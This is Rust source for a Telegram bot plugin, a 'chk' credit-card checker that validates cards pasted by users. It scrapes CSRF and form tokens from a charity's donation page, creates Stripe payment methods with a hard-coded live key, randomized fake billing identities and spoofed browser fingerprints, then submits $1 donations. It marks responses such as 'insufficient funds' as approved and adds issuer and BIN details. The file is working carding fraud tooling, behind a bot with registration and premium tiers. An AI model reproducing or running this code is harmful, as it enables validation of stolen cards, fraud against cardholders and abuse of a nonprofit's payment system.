use crate::config::get_config;
use crate::database::sql::{self, fetch_user};
use crate::handle_database_error;
use crate::logging::{get_logger, LoggerHandle};
use crate::plugin_handler::*;
use crate::plugins::helpers::utils::bin_lookup::lookup_bin;
use crate::plugins::helpers::*;
use crate::safe_database_operation;
use chrono::Utc;
use rand::Rng;
use regex::Regex;
use reqwest;
use serde::{Deserialize, Serialize};
use teloxide::payloads::{EditMessageTextSetters, SendMessageSetters};
use teloxide::sugar::request::RequestLinkPreviewExt;
use teloxide::types::{Message, ParseMode};
use teloxide::{prelude::Requester, Bot};
use teloxide_plugin::TeloxidePlugin;
use serde_json::Value;

lazy_static::lazy_static! {
    static ref LOGGER: std::sync::Arc<LoggerHandle> = {
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(get_logger("CHKPlugin"))
        })
    };
}

#[TeloxidePlugin(commands = ["chk", "chk@KissShotChkBot"])]
pub struct CHKPlugin;

impl CHKPlugin {
    pub async fn handle(&self, bot: &Bot, message: &Message, msg: &str) {
        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let user_id = message.from.as_ref().map(|u| u.id.0).unwrap_or(0) as i64;
        let chat_id = message.chat.id.0 as i64;

        let mut input_text = msg.to_string();
        if msg.len() < 16 {
            if let Some(reply) = message.reply_to_message().as_ref() {
                if let Some(reply_text) = reply.text() {
                    input_text = reply_text.to_string();
                }
            }
        }

        let credit_cards = Regex::new(
            get_config()
                .expect("Operation failed")
                .config
                .regex
                .cc_regex
                .as_str(),
        )
        .unwrap();

        let credit_cards_list: Vec<&str> = match credit_cards.find(input_text.as_str()) {
            Some(m) => vec![m.as_str()],
            None => Vec::new(),
        };

        if credit_cards_list.is_empty() {
            let reply = "<b>No credit cards found ❌</b>";
            bot.send_message(message.chat.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let sent_msg = bot
            .send_message(message.chat.id, "<b>Processing...</b>")
            .parse_mode(ParseMode::Html)
            .disable_link_preview(true)
            .await
            .unwrap();

        if !check_registration(user_id).await {
            let access_denied_reason = "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are not registered. Please use: /register";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        } else if check_banned(user_id).await {
            let access_denied_reason =
                "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are banned from using this bot.";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        } else if !check_access(chat_id).await {
            let access_denied_reason = "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are not allowed to access this gateway here. Consider using it at: @heckervaultchat";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let cooldown_remaining = get_antispam(user_id).await;
        if cooldown_remaining > 0 {
            let reply = format!("<b>Rate limited ⏱️</b>\n\n<b>Please wait {} seconds before using this command again.</b>", cooldown_remaining);
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let user_cooldown = get_user_cooldown(user_id).await;
        if user_cooldown == 0 {
            if let Err(e) = set_user_antispam(user_id, 10).await {
                // Log error but don't fail the request
                println!("Failed to set antispam for user {}: {}", user_id, e);
            }
        }

        let mut results = Vec::new();
        let mut vbv_responses: Vec<Option<(String, String, String)>> = Vec::new();
        let start_time = std::time::Instant::now();

        for cc in credit_cards_list.iter() {
            let card_number = cc.split('|').next().unwrap_or(cc);

            if !luhn_check(card_number) {
                results.push(format!(
                    "<code>{}</code>\n<b>Status:</b> Invalid",
                    cc.replace(" | ", "|")
                ));
                vbv_responses.push(None);
            } else {
                match lookup_chk(cc).await {
                    Ok((bin, response, enrolled)) => {
                        let status = if response.contains("Payment completed")
                            || response.contains("insufficient funds")
                            || response.contains("invalid cvc")
                            || response.contains("this type of purchase")
                        {
                            "Approved ✅"
                        } else {
                            "Declined ❌"
                        };
                        results.push(format!(
                            "<code>{}</code>\n<b>Status:</b> {}",
                            cc.replace(" | ", "|"),
                            status
                        ));
                        vbv_responses.push(Some((bin, response, enrolled)));
                    }
                    Err(_) => {
                        results.push(format!(
                            "<code>{}</code>\n<b>Status:</b> Error",
                            cc.replace(" | ", "|")
                        ));
                        vbv_responses.push(None);
                    }
                }
            }

            tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
        }

        let total_time = start_time.elapsed().as_secs_f64();
        let final_text = if credit_cards_list.len() == 1 {
            // Gather requester info
            let (first_name, profile_url) = if let Some(u) = message.from.as_ref() {
                let fname = u.first_name.clone();
                let url = if let Some(username) = u.username.clone() {
                    format!("https://t.me/{}", username)
                } else {
                    format!("tg://user?id={}", u.id.0)
                };
                (fname, url)
            } else {
                ("User".to_string(), "#".to_string())
            };

            // Determine role
            let role = match fetch_user(user_id).await {
                Ok(Some(u)) => match u.status.as_str() {
                    "ADMIN" => "Admin".to_string(),
                    "PREMIUM" => "Premium".to_string(),
                    _ => "Free".to_string(),
                },
                _ => "Free".to_string(),
            };

            // Proxy status
            let proxy_live = get_config()
                .expect("Operation failed")
                .config
                .proxy
                .proxy
                .is_some();
            let proxy_str = if proxy_live { "Live" } else { "Off" };

            let status = if results[0].contains("Approved") {
                "Approved ✅"
            } else {
                "Declined ❌"
            };
            // Use raw VBV response for the "Response:" line (do not change the top status)
            let response_text = if let Some(Some((_, resp, _))) = vbv_responses.get(0) {
                if !resp.is_empty() {
                    // Remove emojis from response but keep the text
                    resp.replace("✅", "").replace("❌", "").trim().to_string()
                } else if results[0].contains("Approved") {
                    "Approved".to_string()
                } else {
                    "Declined".to_string()
                }
            } else {
                if results[0].contains("Approved") {
                    "Approved".to_string()
                } else {
                    "Declined".to_string()
                }
            };

            let bin_info = match lookup_bin(&credit_cards_list[0][..6]).await {
                Ok(bin_data) => format!(
                    "\n\n<b>Info</b>: {} - {} - {}\n<b>Issuer</b>: {}\n<b>Country</b>: {} {}\n\n<b>Requested</b>: <a href=\"{}\">{}</a> [{}]\n<b>Proxy</b>: {}  <b>Retry</b>: 0\n<b>Time</b>: {:.2} seconds",
                    bin_data.vendor, bin_data.btype, bin_data.level, bin_data.bank, bin_data.country, bin_data.flag, profile_url, first_name, role, proxy_str, total_time
                ),
                Err(_) => format!(
                    "\n\n<b>Requested</b>: <a href=\"{}\">{}</a> [{}]\n<b>Proxy</b>: {} | <b>Retry</b>: 0\n<b>Time</b>: {:.2} seconds",
                    profile_url, first_name, role, proxy_str, total_time
                )
            };

            format!(
                "<b>{}</b>\n\n<b>Card</b>: <code>{}</code>\n<b>Gateway</b>: Stripe Premium\n<b>Response</b>: {}{}",
                status,
                credit_cards_list[0].replace(" | ", "|"),
                response_text,
                bin_info
            )
        } else {
            format!(
                "<b>Total:</b> <code>{}</code> | <b>Processed:</b> <code>{}</code>\n\n{}\n\n<b>Time:</b> {:.2}s",
                credit_cards_list.len(),
                results.len(),
                results.join("\n\n"),
                total_time
            )
        };

        bot.edit_message_text(message.chat.id, sent_msg.id, final_text)
            .parse_mode(ParseMode::Html)
            .disable_link_preview(true)
            .await
            .unwrap();
    }
}

// Helper function to create HTTP client with proxy and cookie jar (copied from sta.rs pattern)
fn create_proxy_client() -> Result<reqwest::Client, String> {
    let config = get_config().map_err(|e| e.to_string())?;

    if let Some(proxy_url) = &config.config.proxy.proxy {
        let proxy =
            reqwest::Proxy::all(proxy_url).map_err(|e| format!("Failed to create proxy: {}", e))?;

        reqwest::Client::builder()
            .proxy(proxy)
            .timeout(std::time::Duration::from_secs(30))
            .cookie_store(true)
            .build()
            .map_err(|e| format!("Failed to create client with proxy: {}", e))
    } else {
        reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .cookie_store(true)
            .build()
            .map_err(|e| format!("Failed to create client: {}", e))
    }
}

// Generate small random user for billing fields
fn generate_random_user() -> (
    String,
    String,
    String,
    String,
    String,
    String,
    String,
    String,
) {
    let first_names = vec!["John", "Jane", "Alex", "Sam", "Taylor", "Chris"];
    let last_names = vec!["Smith", "Doe", "Brown", "Johnson", "Lee", "Garcia"];
    // Python uses full state names for the "city" field
    let states = vec![
        "New York", "California", "Texas", "Florida", "Illinois",
        "Pennsylvania", "Ohio", "Georgia", "North Carolina", "Michigan"
    ];
    let streets = vec!["123 Main St", "456 Oak Ave", "789 Elm Blvd", "321 Pine Rd"];
    let state_abbrs = vec!["NY", "CA", "TX", "FL", "IL", "PA", "OH", "GA", "NC", "MI"];
    let zips = vec!["10001", "90001", "60601", "77001", "85001"];

    let mut rng = rand::rng();
    let idx = rng.random_range(0..first_names.len());
    let first = first_names[idx].to_string();
    let last = last_names[rng.random_range(0..last_names.len())].to_string();
    let email = format!(
        "{}.{}{}@gmail.com",
        first.to_lowercase(),
        last.to_lowercase(),
        rng.random_range(10..99)
    );
    let phone = format!("+1{:010}", rng.random_range(2000000000..9999999999u64));
    let state_idx = rng.random_range(0..states.len());
    let city = states[state_idx].to_string();  // Python uses state name for city field
    let street = streets[rng.random_range(0..streets.len())].to_string();
    let state = state_abbrs[state_idx].to_string();  // Matching state abbreviation
    let zip = zips[rng.random_range(0..zips.len())].to_string();
    (first, last, email, phone, street, city, state, zip)
}

#[derive(Debug, Deserialize)]
struct StripePaymentMethodResponse {
    pub id: Option<String>,
    pub error: Option<StripeError>,
}

#[derive(Debug, Deserialize)]
struct StripeError {
    pub message: Option<String>,
}

#[derive(Debug, Deserialize)]
struct DonationResponse {
    pub success: Option<bool>,
    #[serde(rename = "formErrors")]
    pub form_errors: Option<Vec<String>>,
}

// Helper to extract string between two delimiters
fn get_str(data: &str, start: &str, end: &str) -> String {
    if let Some(start_pos) = data.find(start) {
        let start_idx = start_pos + start.len();
        if let Some(end_pos) = data[start_idx..].find(end) {
            return data[start_idx..start_idx + end_pos].to_string();
        }
    }
    String::new()
}

// Perform Stripe auth/tokenization via HTTP matching chk.py flow. Returns (BIN, ResponseText, Enrolled)
pub async fn lookup_chk(cc: &str) -> Result<(String, String, String), String> {
    let client = create_proxy_client()?;

    let parts: Vec<&str> = cc.split('|').collect();
    if parts.len() < 4 {
        return Err("Invalid credit card format".to_string());
    }
    let number = parts[0];
    let exp_month = parts[1];
    let exp_year = parts[2];
    let cvc = parts[3];
    let bin = number.get(..6).unwrap_or_default().to_string();

    let (first, last, email, phone, street, city, state, zip) = generate_random_user();

    // Step 1: Fetch donation page and extract form tokens
    let r1 = client
        .get("https://www.elevacare.org/donate")
        .send()
        .await
        .map_err(|e| format!("Failed to fetch donation page: {}", e))?;

    let html = r1
        .text()
        .await
        .map_err(|e| format!("Failed to read donation page: {}", e))?;

    let freeform_form_handle = get_str(&html, "data-honeypot-name=\"freeform_form_handle_", "\"");
    let freeform_handle_value = get_str(&html, "data-honeypot-value=\"", "\"");
    let freeform_payload = get_str(&html, "name=\"freeform_payload\" value=\"", "\"");
    let freeform_hash = get_str(&html, "name=\"formHash\" value=\"", "\"");
    let freeform_csrf = get_str(&html, "name=\"CRAFT_CSRF_TOKEN\" value=\"", "\"");

    // Step 2: Create Stripe payment method
    let stripe_data = [
        ("type", "card"),
        ("card[number]", number),
        ("card[exp_month]", exp_month),
        ("card[exp_year]", exp_year),
        ("card[cvc]", cvc),
        ("billing_details[name]", &format!("{} {}", first, last)),
        ("billing_details[email]", &email),
        ("billing_details[address][line1]", &street),
        ("billing_details[address][city]", &city),
        ("billing_details[address][state]", &state),
        ("billing_details[address][postal_code]", &zip),
        ("billing_details[address][country]", "US"),
        ("key", "pk_live_51JzKwAKIjZLk12u28YUANXxO0pOLyqglWURJOlziYVRgExARWkIhJjNwx0G1eFVLbhsSq2Ru47YKLuxqfviQqpPQ00w4XfXtbX"),
        ("guid", "16e75b05-b724-4d14-ba0f-95a2d4620845990074"),
        ("muid", "a4c3ba9a-bf8d-417c-aca3-b8b87b96e106ab27b1"),
        ("sid", "7dcca1ae-3b2b-49c7-a828-a4a1d56b7151b6f656"),
        ("payment_user_agent", "stripe.js/0366a8cf46; stripe-js-v3/0366a8cf46; split-card-element"),
        ("referrer", "https://www.elevacare.org"),
        ("time_on_page", "105571"),
        ("client_attribution_metadata[client_session_id]", "e06deeda-0b13-4957-b032-d897995af748"),
        ("client_attribution_metadata[merchant_integration_source]", "elements"),
        ("client_attribution_metadata[merchant_integration_subtype]", "split-card-element"),
        ("client_attribution_metadata[merchant_integration_version]", "2017"),
    ];

    let r2 = client
        .post("https://api.stripe.com/v1/payment_methods")
        .form(&stripe_data)
        .send()
        .await
        .map_err(|e| format!("Failed to create payment method: {}", e))?;

    let pm_body = r2
        .text()
        .await
        .map_err(|e| format!("Failed to read payment method response: {}", e))?;

    let pm_data: StripePaymentMethodResponse = serde_json::from_str(&pm_body)
        .map_err(|e| format!("Failed to parse payment method response: {}", e))?;

    if let Some(err) = pm_data.error {
        let msg = err
            .message
            .unwrap_or_else(|| "Unknown stripe error".to_string());
        return Ok((bin, format!("{}", msg), String::new()));
    }

    let pm_id = pm_data
        .id
        .ok_or_else(|| "No payment method ID returned".to_string())?;

    // Step 3: Submit donation form with payment method
    // Use the extracted formHash instead of a hardcoded value
    // NOTE: Python code uses state as the city value, and hardcodes "NY" for state field
    let form_body = format!(
        "------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"freeform_form_handle_{}\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"freeform_payload\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"formHash\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nfreeform/submit\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"CRAFT_CSRF_TOKEN\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"freeform-action\"\r\n\r\nsubmit\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"donationAmount\"\r\n\r\n1\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"payment\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"firstName\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"lastName\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"address\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"city\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"state\"\r\n\r\nNY\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"zipCode\"\r\n\r\n{}\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"message\"\r\n\r\n\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"grecaptcha_Qm1ozmRP8\"\r\n\r\n\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf\r\nContent-Disposition: form-data; name=\"form_page_submit\"\r\n\r\n0\r\n------WebKitFormBoundarywtdfdx7DkJG8toyf--\r\n",
        freeform_form_handle, freeform_handle_value, freeform_payload, freeform_hash, freeform_csrf,
        pm_id, first, last, email, phone, street, city, zip
    );

    let r3 = client
        .post("https://www.elevacare.org/donate")
        .header("authority", "www.elevacare.org")
        .header("method", "POST")
        .header("path", "/donate")
        .header("scheme", "https")
        .header("accept", "*/*")
        .header("accept-language", "en-US,en;q=0.7")
        .header("cache-control", "no-cache")
        .header("content-type", "multipart/form-data; boundary=----WebKitFormBoundarywtdfdx7DkJG8toyf")
        .header("http_x_requested_with", "XMLHttpRequest")
        .header("origin", "https://www.elevacare.org")
        .header("priority", "u=1, i")
        .header("referer", "https://www.elevacare.org/donate")
        .header("sec-ch-ua", "\"Brave\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"")
        .header("sec-ch-ua-mobile", "?0")
        .header("sec-ch-ua-platform", "\"Linux\"")
        .header("sec-fetch-dest", "empty")
        .header("sec-fetch-mode", "cors")
        .header("sec-fetch-site", "same-origin")
        .header("sec-gpc", "1")
        .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
        .header("x-requested-with", "XMLHttpRequest")
        .body(form_body)
        .send()
        .await
        .map_err(|e| format!("Failed to submit donation form: {}", e))?;

    let response_text = r3
        .text()
        .await
        .map_err(|e| format!("Failed to read donation response: {}", e))?;

    if let Ok(data) = serde_json::from_str::<DonationResponse>(&response_text) {
        if data.success == Some(true) {
            return Ok((bin, "Payment completed".to_string(), String::new()));
        }
        if let Some(errors) = data.form_errors {
            if !errors.is_empty() {
                return Ok((bin, errors[0].clone(), String::new()));
            }
        }
    }

    // Check for common approval indicators from response
    if response_text.contains("Payment completed") 
        || response_text.contains("success")
        || response_text.contains("completed") {
        return Ok((bin, "Payment processed".to_string(), String::new()));
    }
    
    // Check for authentication/verification responses
    if response_text.contains("requires_action")
        || response_text.contains("requires_authentication") {
        return Ok((bin, "Authentication required".to_string(), String::new()));
    }

    // Check for verification required
    if response_text.contains("3d_secure")
        || response_text.contains("verification") {
        return Ok((bin, "Verification required".to_string(), String::new()));
    }

    let cleaned_response = "Unknown Action".to_string();

    Ok((bin, cleaned_response, String::new()))
}
